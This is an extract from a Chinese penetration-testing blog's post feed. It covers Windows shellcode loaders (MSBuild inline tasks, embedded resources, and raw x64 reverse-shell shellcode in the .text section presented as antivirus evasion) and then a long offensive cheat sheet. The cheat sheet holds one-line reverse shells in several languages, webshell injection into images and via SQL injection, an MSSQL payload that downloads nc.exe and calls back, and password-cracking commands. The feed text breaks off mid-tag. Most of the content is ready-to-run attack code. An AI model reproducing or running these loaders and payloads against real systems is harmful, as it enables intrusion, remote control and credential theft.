,0xf8,0xa2,0x06,0xf6,0xb7,0x2d,0x8e,0xe3,0x6d,0x65,0x04,0x0c,0xee,0xa5,0x06,0x85,0x1d,0x86,0x0f,0xe3,0x6d,0x77,0xae,0x68,0xb2,0x0d,0x20,0x14,0xcd,0x1e,0x86,0x7b,0xb8,0xf2,0x6e,0x76,0xb8,0x98,0x6a,0x4a,0xef,0x9a,0x6c,0xc5,0x70,0xad,0x91,0xc9,0x3b,0x0a,0x6e,0x62,0x8e,0x79,0x58,0x76,0xf8,0x9a,0x6e,0x0c,0xb8,0xf2,0x38,0x76,0xb8,0x9a,0x36,0xb8,0xeb,0x17,0x91,0xc9,0x2b,0xa1,0x04,0x1c,0xee,0xa1,0x39,0x74,0xba,0x2b,0xa6,0x43,0x47,0x27,0xed,0xe4,0xb8,0x8f,0x46,0x44,0xd0,0xf2,0x2e,0x1c,0xb8,0x98,0x6e,0x4c,0xd0,0xf9,0x41,0x13,0x88,0x0d,0xbb,0x4b,0xd0,0x87,0x00,0x51,0xd9,0x0d,0xbb,0x42,0xe6,0x0d,0x62,0x38,0xb7,0x77,0x1e,0xe3,0x47,0x0d,0x87,0x87,0x47,0x0d,0x91,0x1d,0x7b,0xdb,0xa8,0x69,0x79,0x31,0xd5,0xec,0x0d,0x50,0x38,0x76,0xb8,0xa1,0x91,0xc9,0xb8,0xf2,0x6e &#125;;                            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,            MEM_COMMIT, PAGE_EXECUTE_READWRITE);              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);              IntPtr hThread = IntPtr.Zero;              UInt32 threadId = 0;              IntPtr pinfo = IntPtr.Zero;              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);              WaitForSingleObject(hThread, 0xFFFFFFFF);              return true;          &#125;         &#125;               ]]&gt;          &lt;/Code&gt;        &lt;/Task&gt;      &lt;/UsingTask&gt;    &lt;/Project&gt;</code></pre><h3 id="0x02-执行载荷"><a href="#0x02-执行载荷" class="headerlink" title="0x02 执行载荷"></a>0x02 执行载荷</h3><p>首先利用MSF的<code>exploit/multi/handler</code>开启监听，然后我们在受控主机上执行：</p><pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319&gt;MSBuild D:/bad.xml</code></pre><p><img src="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/image-20201228133814195.png" alt="image-20201228133814195"></p><p>回连Shell如下：</p><p><img src="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/image-20201228133910387.png" alt="image-20201228133910387"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Shellcode </tag>
            
            <tag> 持久化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过资源文件加载Shellcode</title>
      <link href="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/"/>
      <url>/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-生成Shellcode"><a href="#0x01-生成Shellcode" class="headerlink" title="0x01 生成Shellcode"></a>0x01 生成Shellcode</h3><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.133 LPORT=12345 &gt;payload.bin</code></pre><h3 id="0x02-添加资源文件"><a href="#0x02-添加资源文件" class="headerlink" title="0x02 添加资源文件"></a>0x02 添加资源文件</h3><p>右键<code>资源文件&gt;添加&gt;资源</code>添加我们刚刚生成的Shellcode</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140005634.png" alt="image-20201225140005634"></p><p>选择<code>导入</code>，添加<code>payload.bin</code></p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140229778.png" alt="image-20201225140229778"></p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140458518.png" alt="image-20201225140458518"></p><p>我们可以在资源文件中看到我们的bin文件已经被加载</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140603313.png" alt="image-20201225140603313"></p><p>代码：</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &quot;resource.h&quot;int main()&#123;    // IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode    // METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin    HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD_BIN1), L&quot;PAYLOAD_BIN&quot;);    DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);    HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);    void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    memcpy(exec, shellcodeResouceData, shellcodeSize);    ((void(*)())exec)();    return  0;&#125;</code></pre><h3 id="0x03-编译和验证"><a href="#0x03-编译和验证" class="headerlink" title="0x03 编译和验证"></a>0x03 编译和验证</h3><p>编译成功没有什么问题</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225141139791.png" alt="image-20201225141139791"></p><p>生成的exe放到虚拟机里运行一下，成功</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225141256996.png" alt="image-20201225141256996"></p><p>免杀率……将就吧，毕竟并没有做什么免杀的措施，只是一种加载shellcode的技巧而已</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225141643919.png" alt="image-20201225141643919"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Shellcode </tag>
            
            <tag> 后渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>避开Windows API执行Shellcode</title>
      <link href="/2020/11/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/"/>
      <url>/2020/11/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/</url>
      
        <content type="html"><![CDATA[<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><pre><code class="c++">#pragma section(&quot;.text&quot;)// msvenom -p windows/x64/shell_reverse_tcp lhost=X lport=Y -f c__declspec(allocate(&quot;.text&quot;)) char goodcode[] =&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;&quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;&quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;&quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;&quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33&quot;&quot;\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00&quot;&quot;\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x38\x66\x41\x54&quot;&quot;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c&quot;&quot;\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff&quot;&quot;\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2&quot;&quot;\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48&quot;&quot;\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99&quot;&quot;\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63&quot;&quot;\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57&quot;&quot;\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44&quot;&quot;\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6&quot;&quot;\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff&quot;&quot;\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5&quot;&quot;\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff&quot;&quot;\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48&quot;&quot;\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13&quot;&quot;\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&quot;;int main()&#123;    (*(void(*)())(&amp;goodcode))();&#125;</code></pre><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>这种Shellcode的加载方式可以在编译时将Shellcode完全分配到<code>.text</code>段。此外将包含Shellcode的数组转换为函数指针并调用，从而避免了调用<code>CreateThread</code>之类的常用于跳转至Shellcode的Windows API。</p><p>这种方式可以有效避开一些杀毒软件的查杀。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Shellcode </tag>
            
            <tag> 后渗透 </tag>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试速查表</title>
      <link href="/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/"/>
      <url>/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h2><h3 id="存活IP扫描"><a href="#存活IP扫描" class="headerlink" title="存活IP扫描"></a>存活IP扫描</h3><pre><code class="shell">nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep &quot;/open&quot; | cut -d &quot; &quot; -f 2 &gt; exposed-services-ips</code></pre><h3 id="批量Ping"><a href="#批量Ping" class="headerlink" title="批量Ping"></a>批量Ping</h3><pre><code class="shell">#!/bin/bashfor lastOctet in &#123;1..254&#125;; do     ping -c 1 10.0.0.$lastOctet | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &amp;done</code></pre><h3 id="单个端口检查"><a href="#单个端口检查" class="headerlink" title="单个端口检查"></a>单个端口检查</h3><pre><code class="shell">nc -v $TARGET 80telnet $TARGET 80curl -vX $TARGET</code></pre><h3 id="少量端口探测"><a href="#少量端口探测" class="headerlink" title="少量端口探测"></a>少量端口探测</h3><pre><code class="shell">for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done</code></pre><h3 id="nc端口扫描"><a href="#nc端口扫描" class="headerlink" title="nc端口扫描"></a>nc端口扫描</h3><pre><code class="shell">nc -nvv -w 1 -z host 1000-2000nc -nv -u -z -w 1 host 160-162</code></pre><h3 id="Masscan端口扫描"><a href="#Masscan端口扫描" class="headerlink" title="Masscan端口扫描"></a>Masscan端口扫描</h3><pre><code class="shell">masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0</code></pre><h3 id="DNS信息查询-子域名爆破"><a href="#DNS信息查询-子域名爆破" class="headerlink" title="DNS信息查询&#x2F;子域名爆破"></a>DNS信息查询&#x2F;子域名爆破</h3><pre><code class="shell">whois domain.comdig &#123;a|txt|ns|mx&#125; domain.comdig &#123;a|txt|ns|mx&#125; domain.com @ns1.domain.comhost -t &#123;a|txt|ns|mx&#125; megacorpone.comhost -a megacorpone.comhost -l megacorpone.com ns1.megacorpone.comdnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.comdnsenum domain.comnslookup -&gt; set type=any -&gt; ls -d domain.comfor sub in $(cat subdomains.txt);do host $sub.domain.com|grep &quot;has.address&quot;;done</code></pre><h3 id="NFS-Exported-Shares"><a href="#NFS-Exported-Shares" class="headerlink" title="NFS Exported Shares"></a>NFS Exported Shares</h3><pre><code class="shell">#列出NFS共享，如果存在&#39;rw,no_root_squash&#39;，可上传并执行sid-shellshowmount -e 192.168.110.102chown root:root sid-shell; chmod +s sid-shell</code></pre><h3 id="Kerberos枚举"><a href="#Kerberos枚举" class="headerlink" title="Kerberos枚举"></a>Kerberos枚举</h3><pre><code class="shell"># usersnmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&#39;test&#39;</code></pre><h3 id="Web漏洞扫描（简易）"><a href="#Web漏洞扫描（简易）" class="headerlink" title="Web漏洞扫描（简易）"></a>Web漏洞扫描（简易）</h3><pre><code class="shell">target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobustertarget=10.0.0.1; nikto -h http://$target:80 | tee $target-niktotarget=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum</code></pre><h3 id="RPC-NetBios-SMB探测"><a href="#RPC-NetBios-SMB探测" class="headerlink" title="RPC&#x2F;NetBios&#x2F;SMB探测"></a>RPC&#x2F;NetBios&#x2F;SMB探测</h3><pre><code class="shell">rpcinfo -p $TARGETnbtscan $TARGET#list sharessmbclient -L //$TARGET -U &quot;&quot;# null sessionrpcclient -U &quot;&quot; $TARGETsmbclient -L //$TARGETenum4linux $TARGET</code></pre><h3 id="SNMP探测"><a href="#SNMP探测" class="headerlink" title="SNMP探测"></a>SNMP探测</h3><pre><code class="shell"># Windows User Accountssnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25# Windows Running Programssnmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2# Windows Hostnamesnmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5# Windows Share Informationsnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1# Windows Share Informationsnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27# Windows TCP Portssnmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3# Software Namesnmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2# brute-force community stringsonesixtyone -i snmp-ips.txt -c community.txtsnmp-check $TARGET</code></pre><h3 id="SMTP探测"><a href="#SMTP探测" class="headerlink" title="SMTP探测"></a>SMTP探测</h3><pre><code class="shell">smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150</code></pre><h3 id="域信息探测"><a href="#域信息探测" class="headerlink" title="域信息探测"></a>域信息探测</h3><pre><code class="shell"># current domain info[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()# domain trusts([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()# current forest info[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()# get forest trust relationships([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&#39;Forest&#39;, &#39;forest-of-interest.local&#39;)))).GetAllTrustRelationships()# get DCs of a domainnltest /dclist:offense.localnet group &quot;domain controllers&quot; /domain# get DC for currently authenticated sessionnltest /dsgetdc:offense.local# get domain trusts from cmd shellnltest /domain_trusts# get user infonltest /user:&quot;spotless&quot;# get DC for currently authenticated sessionset l# get domain name and DC the user authenticated toklist# get all logon sessions. Includes NTLM authenticated sessionsklist sessions# kerberos tickets for the sessionklist# cached krbtgtklist tgt# whoami on older Windows systemsset u# find DFS shares with ADModuleGet-ADObject -filter * -SearchBase &quot;CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot; | select name# find DFS shares with ADSI$s=[adsisearcher]&#39;(name=*)&#39;; $s.SearchRoot = [adsi]&quot;LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot;; $s.FindAll() | % &#123;$_.properties.name&#125;# check if spooler service is running on a hostpowershell ls &quot;\\dc01\pipe\spoolss&quot;</code></pre><h3 id="Powershell下的端口监听"><a href="#Powershell下的端口监听" class="headerlink" title="Powershell下的端口监听"></a>Powershell下的端口监听</h3><pre><code class="powershell"># Start listener on port 443$listener = [System.Net.Sockets.TcpListener]443; $listener.Start(); while($true)&#123;    $client = $listener.AcceptTcpClient();    Write-Host $client.client.RemoteEndPoint &quot;connected!&quot;;    $client.Close();    start-sleep -seconds 1;&#125;</code></pre><h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><pre><code class="shell">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></pre><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><pre><code class="shell">perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;#URL-Encoded Perl: Linuxecho%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew</code></pre><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre><code class="shell">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><pre><code class="shell">php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><pre><code class="shell">ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code></pre><h3 id="Netcat-without-e"><a href="#Netcat-without-e" class="headerlink" title="Netcat without -e"></a>Netcat without -e</h3><pre><code class="shell">#1rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.0.0.1 1234 &gt; /tmp/f#2nc localhost 443 | /bin/sh | nc localhost 444</code></pre><h3 id="Telnet-Linux"><a href="#Telnet-Linux" class="headerlink" title="Telnet(Linux)"></a>Telnet(Linux)</h3><pre><code class="shell">telnet localhost 443 | /bin/sh | telnet localhost 444</code></pre><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><pre><code class="shell">r = Runtime.getRuntime(); p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]); p.waitFor();</code></pre><h3 id="XTerm"><a href="#XTerm" class="headerlink" title="XTerm"></a>XTerm</h3><pre><code class="shell">xterm -display 10.0.0.1:1</code></pre><h3 id="非交互式shell升级"><a href="#非交互式shell升级" class="headerlink" title="非交互式shell升级"></a>非交互式shell升级</h3><pre><code class="shell">python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;/bin/busybox sh</code></pre><p>[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;]</p><h2 id="JDWP-RCE"><a href="#JDWP-RCE" class="headerlink" title="JDWP RCE"></a>JDWP RCE</h2><pre><code class="shell">print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&quot;whoami&quot;).getInputStream())).readLine())</code></pre><p>[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;]</p><h2 id="木马生成"><a href="#木马生成" class="headerlink" title="木马生成"></a>木马生成</h2><h3 id="msf生成有效载荷"><a href="#msf生成有效载荷" class="headerlink" title="msf生成有效载荷"></a>msf生成有效载荷</h3><pre><code class="shell">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b &quot;\x00\x0a\x0d&quot; -e x86/shikata_ga_nai</code></pre><h3 id="Linux下编译c代码"><a href="#Linux下编译c代码" class="headerlink" title="Linux下编译c代码"></a>Linux下编译c代码</h3><pre><code class="shell"># Windowsi686-w64-mingw32-gcc source.c -lws2_32 -o out.exe# Linuxgcc -m32|-m64 -o output source.c</code></pre><h3 id="Windows下编译为-obj"><a href="#Windows下编译为-obj" class="headerlink" title="Windows下编译为.obj"></a>Windows下编译为.obj</h3><pre><code class="shell"># https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=Dnasm -f win64 .\hello.asm -o .\hello.obj# http://www.godevtool.com/Golink.zipGoLink.exe -o .\hello.exe .\hello.obj</code></pre><h3 id="py文件转换exe"><a href="#py文件转换exe" class="headerlink" title="py文件转换exe"></a>py文件转换exe</h3><pre><code class="shell">python pyinstaller.py --onefile convert-to-exe.py</code></pre><h3 id="生成有效载荷模式并计算偏移量"><a href="#生成有效载荷模式并计算偏移量" class="headerlink" title="生成有效载荷模式并计算偏移量"></a>生成有效载荷模式并计算偏移量</h3><pre><code class="shell">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE</code></pre><h2 id="WEB文件上传"><a href="#WEB文件上传" class="headerlink" title="WEB文件上传"></a>WEB文件上传</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><pre><code>file.php -&gt; file.jpgfile.php -&gt; file.php.jpgfile.asp -&gt; file.asp;.jpgfile.gif (contains php code, but starts with string GIF/GIF98)00%file.jpg with php backdoor in exif (see below).jpg -&gt; proxy intercept -&gt; rename to .php</code></pre><h3 id="制作图片马"><a href="#制作图片马" class="headerlink" title="制作图片马"></a>制作图片马</h3><p>图片文件后门语句注入</p><pre><code class="shell">exiv2 -c&#39;A &quot;&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;!&#39; backdoor.jpegexiftool “-comment&lt;=back.php” back.png</code></pre><h3 id="htaccess文件配置"><a href="#htaccess文件配置" class="headerlink" title=".htaccess文件配置"></a>.htaccess文件配置</h3><pre><code class="shell">#上传.htaccess文件将.blah文件解析为.php文件AddType application/x-httpd-php .blah</code></pre><h3 id="SQL注入上传WebShell"><a href="#SQL注入上传WebShell" class="headerlink" title="SQL注入上传WebShell"></a>SQL注入上传WebShell</h3><p>手工：</p><pre><code># Assumed 3 columnshttp://target/index.php?vulnParam=0&#39; UNION ALL SELECT 1,&quot;&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;,2,3 INTO OUTFILE &quot;c:/evil.php&quot;-- uMj</code></pre><p>SQLMap</p><pre><code class="shell"># sqlmap; post-request - captured request via Burp Proxy via Save Item to File.sqlmap -r post-request -p item --level=3 --risk=2 --dbms=mysql --os-shell --threads 10</code></pre><p>NetCat(适用于xp_cmdshell可用的SQL Server)</p><pre><code class="shell"># netcat reverse shell via mssql injection when xp_cmdshell is available1000&#39;;+exec+master.dbo.xp_cmdshell+&#39;(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+&gt;+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd&#39;;--</code></pre><h2 id="密码暴破"><a href="#密码暴破" class="headerlink" title="密码暴破"></a>密码暴破</h2><h3 id="hydra破解Web服务密码"><a href="#hydra破解Web服务密码" class="headerlink" title="hydra破解Web服务密码"></a>hydra破解Web服务密码</h3><pre><code class="shell">hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list &quot;/endpoit/login:usernameField=^USER^&amp;passwordField=^PASS^:unsuccessfulMessage&quot; -s PORT -P /usr/share/wordlists/list</code></pre><h3 id="hydra破解通用协议口令"><a href="#hydra破解通用协议口令" class="headerlink" title="hydra破解通用协议口令"></a>hydra破解通用协议口令</h3><pre><code class="shell">hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1</code></pre><h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><pre><code class="shell"># Bruteforce based on the pattern;hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout  # Generate password candidates: wordlist + pattern;hashcat -a6 -m0 &quot;e99a18c428cb38d5f260853678922e03&quot; yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout# Generate NetNLTMv2 with internalMonologue and crack with hashcatInternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800# resulting hashspotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000# crack with hashcathashcat -m5600 &#39;spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000&#39; -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable</code></pre><h3 id="破解zip文件密码"><a href="#破解zip文件密码" class="headerlink" title="破解zip文件密码"></a>破解zip文件密码</h3><pre><code class="shell">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip</code></pre><h2 id="本地信息挖掘"><a href="#本地信息挖掘" class="headerlink" title="本地信息挖掘"></a>本地信息挖掘</h2><h3 id="寻找可读-写文件夹"><a href="#寻找可读-写文件夹" class="headerlink" title="寻找可读&#x2F;写文件夹"></a>寻找可读&#x2F;写文件夹</h3><pre><code class="powershell">$a = Get-ChildItem &quot;c:\windows\&quot; -recurse -ErrorAction SilentlyContinue$a | % &#123;    $fileName = $_.fullname    $acls = get-acl $fileName  -ErrorAction SilentlyContinue | select -exp access | ? &#123;$_.filesystemrights -match &quot;full|modify|write&quot; -and $_.identityreference -match &quot;authenticated users|everyone|$env:username&quot;&#125;    if($acls -ne $null)    &#123;        [pscustomobject]@&#123;            filename = $fileName            user = $acls | select -exp identityreference        &#125;    &#125;&#125;</code></pre><h3 id="检查是否已启用Powershell日志记录"><a href="#检查是否已启用Powershell日志记录" class="headerlink" 